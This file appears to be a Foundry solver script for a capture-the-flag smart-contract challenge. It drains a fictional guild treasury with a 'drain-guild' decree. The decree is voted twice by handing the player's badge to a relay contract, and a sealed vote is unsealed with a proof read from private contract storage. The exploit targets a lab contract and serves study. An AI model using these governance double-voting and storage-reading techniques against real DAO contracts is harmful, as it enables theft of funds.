// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import "forge-ctf/CTFSolver.sol";

import {Challenge} from "src/Challenge.sol";
import {Guild} from "src/Guild.sol";
import {Overseer} from "src/Overseer.sol";
import {SealedTurncloak} from "src/elders/SealedTurncloak.sol";

contract BadgeRelay {
    bytes32 private constant DECREE_VOTED = keccak256("DECREE_VOTED");
    bytes32 private constant DECREE_ENACTED = keccak256("DECREE_ENACTED");

    Overseer public immutable overseer;
    Guild public immutable guild;
    bytes16 public immutable playerBadge;
    bytes16 public immutable decreeId;
    bytes16 public immutable guildBadge;

    constructor(Overseer _overseer, Guild _guild, bytes16 _playerBadge, bytes16 _decreeId) {
        overseer = _overseer;
        guild = _guild;
        playerBadge = _playerBadge;
        decreeId = _decreeId;
        guildBadge = _guild.badge();
    }

    function acceptAndVote() external {
        overseer.acceptBadgeChange(playerBadge);
        overseer.oversee(
            playerBadge,
            guildBadge,
            DECREE_VOTED,
            bytes32(decreeId),
            abi.encode(decreeId, uint8(Guild.Verdict.Aye))
        );
    }

    function tick() external {}

    function enact() external {
        overseer.oversee(
            playerBadge,
            guildBadge,
            DECREE_ENACTED,
            bytes32(decreeId),
            abi.encode(decreeId)
        );
    }

    receive() external payable {}
}

contract Solve is CTFSolver {
    bytes32 internal constant DECREE_PROPOSED = keccak256("DECREE_PROPOSED");
    bytes32 internal constant DECREE_VOTED = keccak256("DECREE_VOTED");
    uint256 internal constant SEALED_PROOF_SLOT = 10;

    function solve(address challengeAddress, address player) internal override {
        Challenge challenge = Challenge(challengeAddress);
        Overseer overseer = challenge.overseer();
        Guild guild = challenge.guild();
        SealedTurncloak sealedTurncloak = challenge.sealedTurncloak();

        bytes16 decreeId = bytes16(keccak256("drain-guild"));
        bytes16 playerBadge = overseer.folkToBadge(player);
        BadgeRelay relay = new BadgeRelay(overseer, guild, playerBadge, decreeId);

        Guild.Edict[] memory edicts = new Guild.Edict[](1);
        edicts[0] = Guild.Edict({to: player, value: address(guild).balance, data: ""});

        overseer.oversee(
            playerBadge,
            guild.badge(),
            DECREE_PROPOSED,
            bytes32(decreeId),
            abi.encode(decreeId, edicts)
        );
        overseer.oversee(
            playerBadge,
            guild.badge(),
            DECREE_VOTED,
            bytes32(decreeId),
            abi.encode(decreeId, uint8(Guild.Verdict.Aye))
        );

        overseer.proposeBadgeChange(address(relay));
        relay.acceptAndVote();

        sealedTurncloak.unseal(
            decreeId,
            uint8(Guild.Verdict.Aye),
            uint256(vm.load(address(sealedTurncloak), bytes32(SEALED_PROOF_SLOT)))
        );

        for (uint256 i; i < 15; i++) {
            relay.tick();
        }

        relay.enact();
    }
}
